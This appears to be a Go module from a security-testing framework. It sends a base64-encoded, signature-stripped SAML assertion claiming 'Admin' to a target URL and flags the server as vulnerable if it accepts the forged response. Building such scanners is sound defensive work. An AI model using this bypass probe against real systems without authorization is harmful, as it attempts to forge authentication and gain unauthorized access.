package core

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"
)

// SAMLAssertionTestingResult holds the result of the SAMLAssertionTesting module execution.
type SAMLAssertionTestingResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// SAMLAssertionTesting executes the saml_assertion_testing security technique.
type SAMLAssertionTesting struct {
	BaseModule
	Target  string
	results []SAMLAssertionTestingResult
}

// NewSAMLAssertionTesting creates a new instance.
func NewSAMLAssertionTesting(target string) *SAMLAssertionTesting {
	return &SAMLAssertionTesting{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *SAMLAssertionTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

var samlPayloads = []string{
	// Stripped signature payload
	"PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiPjxTYW1sQXV0aD5BZG1pbjwvU2FtbEF1dGg+PC9zYW1scDpSZXNwb25zZT4=",
}

func (m *SAMLAssertionTesting) getBaselineStatus(ctx context.Context) int {
	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, strings.NewReader("SAMLResponse=invalid_baseline_data"))
	if err != nil {
		return 0
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := m.Client.Do(req)
	if err != nil {
		return 0
	}
	defer resp.Body.Close()

	return resp.StatusCode
}

func (m *SAMLAssertionTesting) Execute(ctx context.Context) ([]SAMLAssertionTestingResult, error) {
	m.results = make([]SAMLAssertionTestingResult, 0)

	baselineStatus := m.getBaselineStatus(ctx)

	jobs := make(chan string, len(samlPayloads))
	for _, p := range samlPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, payload, baselineStatus)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *SAMLAssertionTesting) testPayload(ctx context.Context, payload string, baselineStatus int) {
	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, strings.NewReader("SAMLResponse="+payload))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := m.Client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK && baselineStatus != http.StatusOK {
		m.Mu.Lock()
		m.RecordPoC(req, nil, "Server accepted a SAML Assertion with a stripped signature.")
		m.results = append(m.results, SAMLAssertionTestingResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: "Server accepted a SAML Assertion with a stripped signature.",
		})
		m.Mu.Unlock()
	}
}

func init() {
	RegisterModule("saml_assertion_testing", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "http://127.0.0.1")
		onLog(fmt.Sprintf("Starting SAMLAssertionTesting on: %s", target))

		tester := NewSAMLAssertionTesting(target)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
